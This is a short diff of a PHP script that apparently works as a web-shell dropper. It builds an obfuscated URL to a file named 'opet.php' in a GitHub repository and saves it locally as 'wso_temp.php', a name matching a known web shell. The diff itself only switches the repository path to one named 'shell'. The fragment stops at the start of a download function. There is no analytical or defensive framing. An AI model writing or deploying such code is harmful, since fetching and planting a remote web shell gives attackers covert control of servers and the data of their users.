@@ -1,6 +1,6 @@
 <?php
 $awo = 'htt'.'ps://';
-$url = $awo.'raw.githubusercontent.com/Dzbackdor/anonymous/main/opet.php';
+$url = $awo.'raw.githubusercontent.com/Dzbackdor/shell/master/opet.php';
 $local_file = 'wso_temp.php';
 
 function download_content($url, $local_file) {
